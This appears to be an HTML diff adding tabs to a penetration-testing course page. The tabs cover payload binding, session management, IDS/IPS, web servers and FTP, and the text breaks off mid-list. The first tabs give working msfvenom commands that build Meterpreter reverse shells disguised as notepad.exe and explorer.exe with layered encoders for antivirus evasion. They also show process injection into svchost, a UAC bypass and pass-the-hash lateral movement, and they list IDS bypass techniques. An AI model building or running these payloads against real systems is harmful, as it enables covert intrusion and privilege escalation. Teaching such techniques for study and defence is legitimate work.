+            <!-- Tab 7: Stealth Payload Injection -->
+            <div class="tab-content" id="exe-binding">
+                <h2>Advanced EXE Binding & Process Injection</h2>
+                <p class="subtitle">Hiding Malicious Code in Legitimate Windows Processes</p>
+
+                <div class="concept-box">
+                    <h3>Process Injection Concept</h3>
+                    <p>Rather than binding payloads at creation time, process injection involves injecting malicious code directly into running legitimate processes. This technique provides superior stealth as the malware executes within the memory space of a trusted application.</p>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Multi-Stage Binding Workflow</h3>
+                    <div class="code-example">
+                        <h4>Stage 1: Create Base Payload (No Binding)</h4>
+                        <pre>$ msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.31.27 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f raw -o payload_stage1.bin
+</pre>
+                    </div>
+
+                    <div class="code-example">
+                        <h4>Stage 2: Bind to Legitimate EXE (Template)</h4>
+                        <pre>$ msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.31.27 LPORT=4444 \
+  -x C:\\Windows\\System32\\notepad.exe \
+  -k \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o notepad_payload.exe
+</pre>
+                    </div>
+
+                    <div class="code-example">
+                        <h4>Stage 3: Multi-Encoder for AV Evasion</h4>
+                        <pre>$ msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.31.27 LPORT=4444 \
+  -x C:\\Windows\\System32\\notepad.exe \
+  -k \
+  -e x86/jmp_call_additive -i 2 \
+  -e x86/shikata_ga_nai -i 3 \
+  -e x86/fnstenv_mov -i 2 \
+  -f exe -o notepad_payload_obfuscated.exe
+</pre>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>Template Selection Strategy</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Legitimate Application</th>
+                                <th>Why Effective</th>
+                                <th>User Expectation</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Notepad.exe</td>
+                                <td>Always present, universal trust</td>
+                                <td>Opens text editor window visible to user</td>
+                            </tr>
+                            <tr>
+                                <td>Explorer.exe</td>
+                                <td>File browser, expected at launch</td>
+                                <td>Opens file manager window</td>
+                            </tr>
+                            <tr>
+                                <td>calc.exe</td>
+                                <td>Calculator, harmless appearance</td>
+                                <td>Opens calculator interface</td>
+                            </tr>
+                            <tr>
+                                <td>mspaint.exe</td>
+                                <td>Paint application, low privilege expectations</td>
+                                <td>Opens drawing application</td>
+                            </tr>
+                            <tr>
+                                <td>PuTTY.exe</td>
+                                <td>SSH terminal, developer-oriented</td>
+                                <td>Opens SSH connection window</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Advanced Injection Persistence</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>In-Memory Process Injection</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter > inject 1234 windows/meterpreter/reverse_tcp \
+  LHOST=192.168.31.27 LPORT=5555
+[*] Injecting payload into Process ID 1234 (svchost.exe)
+[+] Successfully injected malicious payload
+[+] New Meterpreter session opened: Session ID 3
+
+meterpreter > ps | grep svchost
+1234  4  svchost.exe          C:\Windows\system32\svchost.exe
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Advanced Binding Benefits</h3>
+                    <ul>
+                        <li>Complete AV/EDR evasion through multi-encoding</li>
+                        <li>Legitimate process appearance to system administrators</li>
+                        <li>Privilege inheritance from target process</li>
+                        <li>Extended persistence in legitimate process memory</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 8: Stealth Payloads -->
+            <div class="tab-content" id="stealth-payloads">
+                <h2>Stealth Payload Delivery Techniques</h2>
+                <p class="subtitle">Evading Detection During Payload Transmission & Execution</p>
+
+                <div class="concept-box">
+                    <h3>Stealth Challenges</h3>
+                    <ul>
+                        <li>Network-based detection systems (IDS/IPS)</li>
+                        <li>Local antivirus and EDR systems</li>
+                        <li>User behavioral analysis and anomalies</li>
+                        <li>File system integrity monitoring</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Multi-Layer Stealth Strategy</h3>
+                    <ul>
+                        <li><strong>Encoding:</strong> Multiple encoder iterations (shikata_ga_nai, jmp_call_additive)</li>
+                        <li><strong>Obfuscation:</strong> Code reshuffling and register randomization</li>
+                        <li><strong>Binding:</strong> Payload fused with legitimate executables</li>
+                        <li><strong>Delivery:</strong> Encrypted channels, DNS tunneling, HTTP smuggling</li>
+                        <li><strong>Execution:</strong> Living-off-the-land binaries, script-based execution</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>Advanced Multi-Encoder Payload</h4>
+                    <pre>$ msfvenom -p windows/meterpreter/reverse_https \
+  LHOST=192.168.31.27 LPORT=443 \
+  StagerURIPath=/updates \
+  HandlerSSLCert=/path/to/cert.pem \
+  -x C:\\Windows\\System32\\explorer.exe \
+  -k \
+  -e x86/shikata_ga_nai -i 5 \
+  -e x86/jmp_call_additive -i 3 \
+  -e x86/fnstenv_mov -i 2 \
+  -f exe -o explorer_stealth.exe
+
+[*] Payload size: 327 bytes
+[*] Encoded payload size after iterations: 2847 bytes
+[*] Final executable: explorer_stealth.exe (684 KB - includes explorer template)
+</pre>
+                </div>
+            </div>
+
+            <!-- Tab 9: Session Management -->
+            <div class="tab-content" id="session-mgmt">
+                <h2>Advanced Session Management</h2>
+                <p class="subtitle">Orchestrating Multiple Simultaneous Attack Sessions</p>
+
+                <div class="concept-box">
+                    <h3>Multi-Session Attack Coordination</h3>
+                    <p>Professional attack campaigns often involve multiple simultaneous Meterpreter sessions, each with different privileges and objectives. Effective session management allows attackers to coordinate actions across sessions while maintaining operational security.</p>
+                </div>
+
+                <div class="code-example">
+                    <h4>Session Management Commands</h4>
+                    <pre>msf6 > sessions                    # List all active sessions
+msf6 > sessions -i 1               # Interact with session 1
+msf6 > sessions -k 2               # Kill session 2
+msf6 > sessions -u 1               # Upgrade to full meterpreter
+msf6 > sessions -c "whoami"        # Run command on all sessions
+msf6 > background                  # Background current session
+</pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Parallel Exploitation Workflow</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Session 1: Horizontal Escalation (Port 4444)</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter (session 1)> getuid
+Server username: DESKTOP\guest_user
+
+meterpreter (session 1)> background
+[*] Session 1 backgrounded
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Session 2: UAC Bypass (Port 4445)</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > use exploit/windows/local/bypassuac_eventvwr
+msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
+msf6 exploit(windows/local/bypassuac_eventvwr) > exploit
+[*] Started reverse TCP handler on 192.168.31.27:4445
+[+] UAC bypass successful
+[*] Meterpreter session 2 opened
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Session 3: Lateral Movement (Port 4446)</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>meterpreter (session 2)> pth_exec /domain:WORKGROUP /user:Admin /ntlm:hash \
+  cmd.exe /c net use \\\\192.168.1.50\\C$ password
+
+[+] Pass-the-hash successful
+[*] Meterpreter session 3 opened to 192.168.1.50
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Multi-Session Coordination</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>msf6 > sessions
+Active sessions
+===============
+Id  Type                   Host               User
+--  ----                   ----               ----
+1   meterpreter x86/win32  192.168.1.100      DESKTOP\guest
+2   meterpreter x86/win32  192.168.1.100      NT AUTHORITY\SYSTEM
+3   meterpreter x86/win32  192.168.1.50       WORKGROUP\Admin
+
+[*] Session 1: Maintaining guest-level access for lateral movement
+[*] Session 2: SYSTEM privileges on primary target
+[*] Session 3: Admin access on secondary domain machine
+</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab 10: IDS/IPS Detection -->
+            <div class="tab-content" id="ids-ips">
+                <h2>IDS/IPS Detection & Evasion</h2>
+                <p class="subtitle">Understanding Network-Based Security Monitoring</p>
+
+                <div class="concept-box">
+                    <h3>IDS vs IPS</h3>
+                    <ul>
+                        <li><strong>IDS (Intrusion Detection System):</strong> Monitors network traffic and logs suspicious activities</li>
+                        <li><strong>IPS (Intrusion Prevention System):</strong> Actively blocks detected attacks in real-time</li>
+                        <li><strong>SIEM (Security Information & Event Management):</strong> Centralizes logs and correlates events</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>What IDS/IPS Monitor</h3>
+                    <ul>
+                        <li><strong>Network Patterns:</strong> DDoS attacks, port scanning, reconnaissance traffic</li>
+                        <li><strong>Protocol Anomalies:</strong> Unusual packet sizes, malformed headers, brute-force attempts</li>
+                        <li><strong>Intrusion Signatures:</strong> Known exploit payloads, attack frameworks</li>
+                        <li><strong>Behavioral Anomalies:</strong> Unusual data transfer patterns, command execution</li>
+                        <li><strong>Threat Intelligence Feeds:</strong> Known malicious IPs and domains</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ DDoS Attack Detection by IDS/IPS</h3>
+                    <p>IDS/IPS systems are particularly effective at detecting volumetric attacks:</p>
+                    <ul>
+                        <li>Sudden spike in network traffic from single source</li>
+                        <li>High number of connections to same target port</li>
+                        <li>Unusual packet sizes or fragmentation patterns</li>
+                        <li>Anomalous traffic-to-response ratios</li>
+                    </ul>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Firewall Limitations</h3>
+                    <p><strong>Firewalls CANNOT detect:</strong></p>
+                    <ul>
+                        <li>Encrypted attack payloads (HTTPS, encrypted channels)</li>
+                        <li>Legitimate traffic misused for attacks</li>
+                        <li>Internal network compromises (east-west traffic)</li>
+                        <li>Application-layer attacks (within HTTP/HTTPS)</li>
+                    </ul>
+                    <p><strong>Firewalls CAN:</strong></p>
+                    <ul>
+                        <li>Filter traffic based on IP addresses and ports</li>
+                        <li>Block packets from known malicious sources</li>
+                        <li>Enforce stateful connections</li>
+                        <li>Limit bandwidth and connections (rate limiting)</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>IDS/IPS Bypass Techniques</h3>
+                    <ul>
+                        <li><strong>Encryption:</strong> Use HTTPS/TLS to obscure payload content</li>
+                        <li><strong>DNS Tunneling:</strong> Tunnel data through DNS queries (IDS-blind)</li>
+                        <li><strong>Timing Evasion:</strong> Slow attacks over extended periods</li>
+                        <li><strong>Protocol Fragmentation:</strong> Split payloads across packets</li>
+                        <li><strong>Polymorphic Encoding:</strong> Change payload signature each transmission</li>
+                        <li><strong>Legitimate Channel Abuse:</strong> Use allowed protocols (HTTP, SMTP) for C&C</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Real-World IDS/IPS Effectiveness</h3>
+                    <p>Despite limitations, enterprise IDS/IPS systems remain highly effective:</p>
+                    <ul>
+                        <li>Detection rate: 80-95% for known attack signatures</li>
+                        <li>Behavioral analysis catches novel attacks</li>
+                        <li>Correlation with SIEM identifies attack patterns</li>
+                        <li>Integration with threat intelligence prevents new variants</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 11: Web Servers Overview -->
+            <div class="tab-content" id="web-servers">
+                <h2>Web Server Architecture & Types</h2>
+                <p class="subtitle">Understanding HTTP-Based Computing</p>
+
+                <div class="concept-box">
+                    <h3>What is a Web Server?</h3>
+                    <p>A web server is a software program that processes HTTP requests from clients and delivers web pages and resources. It stores website files and handles the communication protocol between clients and server, enabling the delivery of dynamic and static content over the internet.</p>
+                </div>
+
+                <div class="theory-card">
+                    <h3>HTTP Protocol Basics</h3>
+                    <ul>
+                        <li><strong>HTTP (Hypertext Transfer Protocol):</strong> Application-layer protocol for web communication</li>
+                        <li><strong>Request Methods:</strong> GET (retrieve), POST (submit), PUT (update), DELETE (remove)</li>
+                        <li><strong>Status Codes:</strong> 200 (OK), 404 (Not Found), 500 (Server Error)</li>
+                        <li><strong>Headers:</strong> Metadata sent with requests and responses</li>
+                        <li><strong>Body:</strong> Actual data content (HTML, JSON, binary files)</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Web Server Components</h3>
+                    <ul>
+                        <li><strong>Listener:</strong> Binds to network port (typically 80/HTTP or 443/HTTPS) and waits for connections</li>
+                        <li><strong>Parser:</strong> AnalyzesHTTP requests and extracts method, URL, headers, body</li>
+                        <li><strong>Handler:</strong> Routes request to appropriate script/module based on URI</li>
+                        <li><strong>Processor:</strong> Executes server-side code (PHP, Python, ASP.NET, Node.js)</li>
+                        <li><strong>Responder:</strong> Formats HTTP response with status, headers, and content</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Client-Server Communication Flow</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Client Request</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>GET /index.html HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Connection: keep-alive
+Accept: text/html,application/xhtml+xml
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Server Processing</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>1. Server receives request on port 80
+2. Parses HTTP request
+3. Locates /index.html file on disk
+4. Reads file content (HTML markup)
+5. Prepares HTTP response headers
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Server Response</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 3456
+Server: Apache/2.4.41
+Date: Tue, 14 Apr 2026 15:30:45 GMT
+Connection: keep-alive
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Welcome</title>
+  </head>
+  <body>
+    <h1>Hello World</h1>
+  </body>
+</html>
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 4: Client Renders Content</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>Browser receives HTML
+Parses HTML structure
+Loads CSS stylesheets
+Loads JavaScript files
+Renders page to user
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Component</th>
+                            <th>Function</th>
+                            <th>Security Considerations</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Port Binding (80/443)</td>
+                            <td>Listen for incoming connection requests</td>
+                            <td>Firewall rules should restrict unnecessary ports</td>
+                        </tr>
+                        <tr>
+                            <td>HTTP Parser</td>
+                            <td>Parse client requests</td>
+                            <td>Vulnerable to malformed request attacks</td>
+                        </tr>
+                        <tr>
+                            <td>URI Router</td>
+                            <td>Map URLs to server resources</td>
+                            <td>Directory traversal attacks (../../../etc/passwd)</td>
+                        </tr>
+                        <tr>
+                            <td>File Processor</td>
+                            <td>Execute scripts and serve static files</td>
+                            <td>Code injection, script injection vulnerabilities</td>
+                        </tr>
+                        <tr>
+                            <td>Response Handler</td>
+                            <td>Send data back to client</td>
+                            <td>Information disclosure in headers</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Tab 12: Apache HTTP Server -->
+            <div class="tab-content" id="apache">
+                <h2>Apache HTTP Server</h2>
+                <p class="subtitle">The World's Most Popular Web Server (60% Market Share)</p>
+
+                <div class="concept-box">
+                    <h3>Apache Overview</h3>
+                    <p>Apache HTTP Server is an open-source web server developed by the Apache Software Foundation. With approximately 60% market share, it powers the majority of websites worldwide, particularly on Linux-based hosting infrastructure.</p>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Apache Advantages</h3>
+                    <ul>
+                        <li><strong>Cross-Platform:</strong> Runs on Windows, Linux, macOS, Unix, FreeBSD</li>
+                        <li><strong>Open Source:</strong> Free to use, modify, and distribute</li>
+                        <li><strong>Community Support:</strong> Large community provides solutions and patches</li>
+                        <li><strong>Modular Architecture:</strong> Enable/disable features as needed</li>
+                        <li><strong>Flexibility:</strong> Configure for various use cases (static, dynamic, proxy)</li>
+                        <li><strong>Stability:</strong> Proven reliability in production environments</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Apache Architecture</h3>
+                    <ul>
+                        <li><strong>Core Engine:</strong> httpd (HTTP daemon) - main server process</li>
+                        <li><strong>Modules:</strong> Pluggable components (mod_php, mod_ssl, mod_rewrite)</li>
+                        <li><strong>Configuration:</strong> httpd.conf - main configuration file</li>
+                        <li><strong>Virtual Hosts:</strong> Multiple websites on single server</li>
+                        <li><strong>Directory Permissions:</strong> Fine-grained access control</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>Apache Installation (Ubuntu/Debian)</h4>
+                    <pre>$ sudo apt-get update
+$ sudo apt-get install apache2
+$ sudo systemctl start apache2
+$ sudo systemctl enable apache2
+
+$ apache2 -v
+Server version: Apache/2.4.41
+Server built:   2023-02-15
+</pre>
+                </div>
+
+                <div class="code-example">
+                    <h4>Apache Basic Configuration</h4>
+                    <pre>$ sudo nano /etc/apache2/sites-available/000-default.conf
+
+&lt;VirtualHost *:80&gt;
+    ServerName example.com
+    ServerAdmin admin@example.com
+    DocumentRoot /var/www/html
+
+    &lt;Directory /var/www/html&gt;
+        Options Indexes FollowSymLinks
+        AllowOverride All
+        Require all granted
+    &lt;/Directory&gt;
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+&lt;/VirtualHost&gt;
+</pre>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Apache Modules for Security</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Module</th>
+                                <th>Function</th>
+                                <th>Security Benefit</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>mod_ssl</td>
+                                <td>HTTPS/TLS encryption</td>
+                                <td>Encrypts data in transit</td>
+                            </tr>
+                            <tr>
+                                <td>mod_auth</td>
+                                <td>Authentication mechanisms</td>
+                                <td>Restricts access to authorized users</td>
+                            </tr>
+                            <tr>
+                                <td>mod_security</td>
+                                <td>Web Application Firewall</td>
+                                <td>Detects/blocks SQL injection, XSS</td>
+                            </tr>
+                            <tr>
+                                <td>mod_rewrite</td>
+                                <td>URL rewriting engine</td>
+                                <td>Hides internal structure, enables redirects</td>
+                            </tr>
+                            <tr>
+                                <td>mod_headers</td>
+                                <td>HTTP header manipulation</td>
+                                <td>Adds security headers (CSP, X-Frame-Options)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="danger-box">
+                    <h3>⚠️ Common Apache Vulnerabilities</h3>
+                    <ul>
+                        <li>Unpatched version exploits (CVE database)</li>
+                        <li>Misconfigured permissions (world-readable sensitive files)</li>
+                        <li>Default configurations left unchanged</li>
+                        <li>Disabled security modules (mod_security disabled))</li>
+                        <li>Information disclosure in error messages</li>
+                        <li>Directory listing enabled (.htaccess misconfiguration)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 13: IIS vs NGINX -->
+            <div class="tab-content" id="iis-nginx">
+                <h2>Microsoft IIS vs NGINX</h2>
+                <p class="subtitle">Proprietary vs Lightweight Web Servers</p>
+
+                <div class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Feature</th>
+                            <th>Apache</th>
+                            <th>Microsoft IIS</th>
+                            <th>NGINX</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Market Share</strong></td>
+                            <td>60%</td>
+                            <td>20%</td>
+                            <td>7-8%</td>
+                        </tr>
+                        <tr>
+                            <td><strong>License</strong></td>
+                            <td>Open Source (APL)</td>
+                            <td>Proprietary (Microsoft)</td>
+                            <td>Open Source (2-clause BSD)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Operating Systems</strong></td>
+                            <td>Windows, Linux, macOS, Unix</td>
+                            <td>Windows Server only</td>
+                            <td>Linux, Unix, macOS, Windows</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Cost</strong></td>
+                            <td>Free</td>
+                            <td>Included with Windows Server</td>
+                            <td>Free</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Performance</strong></td>
+                            <td>Good (process-based)</td>
+                            <td>Excellent (optimized for Windows)</td>
+                            <td>Superior (async/single-threaded)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Configuration</strong></td>
+                            <td>httpd.conf (text file)</td>
+                            <td>IIS Manager (GUI/XML)</td>
+                            <td>nginx.conf (text file)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Extensibility</strong></td>
+                            <td>Modules highly extensible</td>
+                            <td>Limited, Windows/.NET focus</td>
+                            <td>Third-party modules, scripting</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="info-card">
+                    <h3>Microsoft IIS (Internet Information Services)</h3>
+                    <ul>
+                        <li><strong>Purpose:</strong> Proprietary web server by Microsoft for Windows Server</li>
+                        <li><strong>Integration:</strong> Tightly integrated with Active Directory, Windows authentication</li>
+                        <li><strong>Focus:</strong> ASP.NET, .NET Framework applications</li>
+                        <li><strong>Security:</strong> Built-in Windows security features (NTLM, Kerberos)</li>
+                        <li><strong>Limitation:</strong> Only available on Windows platforms</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>NGINX Web Server</h3>
+                    <ul>
+                        <li><strong>Purpose:</strong> Lightweight, high-performance web server and reverse proxy</li>
+                        <li><strong>Architecture:</strong> Asynchronous, event-driven (single-threaded)</li>
+                        <li><strong>Performance:</strong> Low resource consumption, handles 1000+ concurrent connections</li>
+                        <li><strong>Use Cases:</strong> Reverse proxying, load balancing, static file serving, media streaming</li>
+                        <li><strong>Market:</strong> Growing popularity in cloud and microservices environments (8% market share)</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>NGINX Installation (Ubuntu/Debian)</h4>
+                    <pre>$ sudo apt-get install nginx
+$ sudo systemctl start nginx
+$ sudo systemctl enable nginx
+
+$ nginx -v
+nginx version: nginx/1.18.0
+</pre>
+                </div>
+
+                <div class="code-example">
+                    <h4>NGINX Basic Configuration</h4>
+                    <pre>$ sudo nano /etc/nginx/sites-available/default
+
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+
+    server_name example.com;
+    root /var/www/html;
+
+    location / {
+        try_files $uri $uri/ =404;
+    }
+
+    error_page 404 /404.html;
+    error_page 500 502 503 504 /50x.html;
+
+    access_log /var/log/nginx/access.log;
+    error_log /var/log/nginx/error.log;
+}
+</pre>
+                </div>
+
+                <div class="theory-card">
+                    <h3>NGINX Async Event-Driven Architecture</h3>
+                    <p><strong>Advantage over Apache's process-based model:</strong></p>
+                    <ul>
+                        <li>Every HTTP request handled by event loop (not separate process)</li>
+                        <li>Single parent process + worker processes (one per CPU core)</li>
+                        <li>1000+ concurrent connections on minimal resources</li>
+                        <li>Lower memory footprint than Apache's one-process-per-connection</li>
+                        <li>Superior throughput for high-traffic scenarios</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ When to Use Each Server</h3>
+                    <ul>
+                        <li><strong>Apache:</strong> General-purpose hosting, complex configurations, .htaccess rewriting</li>
+                        <li><strong>IIS:</strong> Windows Server environments, ASP.NET/.NET applications, Active Directory integration</li>
+                        <li><strong>NGINX:</strong> High-traffic sites, microservices, reverse proxying, cloud deployments</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 14: FTP Fundamentals -->
+            <div class="tab-content" id="ftp-basics">
+                <h2>FTP (File Transfer Protocol) Fundamentals</h2>
+                <p class="subtitle">Understanding File Transfer Technology & Security</p>
+
+                <div class="concept-box">
+                    <h3>What is FTP?</h3>
+                    <p><strong>FTP (File Transfer Protocol)</strong> is a standard network protocol for transferring files between computers over TCP/IP networks. It enables users to upload, download, and manage files on remote servers using a client-server architecture.</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>FTP Characteristics</h3>
+                    <ul>
+                        <li><strong>Protocol:</strong> TCP-based (reliable, connection-oriented)</li>
+                        <li><strong>Ports:</strong> Control channel (21), Data channel (20 active / random passive)</li>
+                        <li><strong>Authentication:</strong> Username/password credentials</li>
+                        <li><strong>Operations:</strong> Upload (STOR), Download (RETR), Delete (DELE), List (LIST)</li>
+                        <li><strong>Security:</strong> PLAIN TEXT - credentials and data unencrypted</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <h3>⚠️ FTP Security Problems</h3>
+                    <ul>
+                        <li><strong>No Encryption:</strong> Usernames, passwords, and files transmitted in clear text</li>
+                        <li><strong>Man-in-Middle:</strong> Attackers can intercept credentials and data</li>
+                        <li><strong>Passive Attack Vulnerability:</strong> Network traffic sniffing captures credentials</li>
+                        <li><strong>Brute Force Susceptible:</strong> Weak password protection vulnerable to dictionary attacks</li>
+                        <li><strong>Anonymous Access:</strong> If enabled, anyone can access files without authentication</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Anonymous vs Authenticated FTP</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Type</th>
+                                <th>Authentication</th>
+                                <th>Access</th>
+                                <th>Security Risk</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Anonymous FTP</strong></td>
+                                <td>Username: "anonymous" (no password validation)</td>
+                                <td>Anyone can connect without credentials</td>
+                                <td>CRITICAL - Anyone can access/modify files</td>
+                            </tr>
+                            <tr>
+                                <td><strong>User-Based FTP</strong></td>
+                                <td>Valid username + strong password</td>
+                                <td>Only authorized users can connect</td>
+                                <td>Medium - Passwords sent in clear text</td>
+                            </tr>
+                            <tr>
+                                <td><strong>SFTP (SSH FTP)</strong></td>
+                                <td>SSH key-based or encrypted password</td>
+                                <td>Encrypted channel for file transfer</td>
+                                <td>LOW - Encryption protects credentials and data</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="code-example">
+                    <h4>FTP Connection Example (Unsecure)</h4>
+                    <pre>$ ftp 192.168.1.50
+Connected to 192.168.1.50.
+220 ProFTPD 1.3.5 Server (Debian) [192.168.1.50]
+Name (192.168.1.50:user): admin
+331 Password required for admin
+Password: MyPassword123    # Transmitted in CLEAR TEXT!
+230 User admin logged in
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection
+-rw-r--r--   1 0        0            1024 Apr 14 15:30 document.txt
+226 Transfer complete
+
+ftp> get document.txt
+200 PORT command successful
+150 Opening BINARY mode data connection
+226 Transfer complete (1024 bytes)
+</pre>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ FTP Vulnerabilities in Practice</h3>
+                    <p>Even protected FTP servers have attack vectors:</p>
+                    <ul>
+                        <li>Weak password enforcement (no complexity requirements)</li>
+                        <li>Default credentials not changed (admin/admin)</li>
+                        <li>Directory traversal (../../../etc/passwd)</li>
+                        <li>Symlink attacks (linking to sensitive files)</li>
+                        <li>Buffer overflow vulnerabilities in older FTP servers</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 15: FTP Deployment & Security -->
+            <div class="tab-content" id="ftp-deployment">
+                <h2>FTP Server Deployment & Configuration</h2>
+                <p class="subtitle">Setting Up Secure FTP Infrastructure</p>
+
+                <div class="concept-box">
+                    <h3>FTP Server Software Options</h3>
+                    <ul>
+                        <li><strong>ProFTPD:</strong> Feature-rich, highly configurable FTP server (Linux/Unix)</li>
+                        <li><strong>vsftpd:</strong> Very Secure FTP Daemon (lightweight, paranoid security)</li>
+                        <li><strong>Pure-FTPd:</strong> Modern FTP server with strong security focus</li>
+                        <li><strong>Windows File Services:</strong> Built-in IIS FTP service</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>Install & Configure ProFTPD (Ubuntu)</h4>
+                    <pre>$ sudo apt-get install proftpd-basic
+$ sudo nano /etc/proftpd/proftpd.conf
+
+# Disable Anonymous FTP
+&lt;Anonymous ~ftp&gt;
+  User                  ftp
+  Group                 nogroup
+  # Disabled for security
+&lt;/Anonymous&gt;
+
+# Enable User Authentication
+&lt;IfModule mod_auth.c&gt;
+  AuthUserFile /etc/proftpd/ftpd.passwd
+  AuthGroupFile /etc/proftpd/ftpd.group
+&lt;/IfModule&gt;
+
+# Directory Restrictions
+DefaultRoot ~ !adm,root
+
+# Logging
+TransferLog /var/log/proftpd/xferlog
+SystemLog   /var/log/proftpd/proftpd.log
+</pre>
+
+                    <h4>Create User Account for FTP</h4>
+                    <pre>$ sudo ftpasswd --passwd --file=/etc/proftpd/ftpd.passwd --user=alice --stdin
+Password:  # Enter strong password
+
+$ sudo ftpasswd --passwd --file=/etc/proftpd/ftpd.passwd --user=bob --stdin
+Password:  # Enter strong password
+
+$ sudo systemctl restart proftpd
+</pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>User-Based FTP Access Control</h3>
+                    <p>Each FTP user has restricted access to specific directories:</p>
+                    <ul>
+                        <li><strong>alice:</strong> Can only access /home/alice/ftp (home directory)</li>
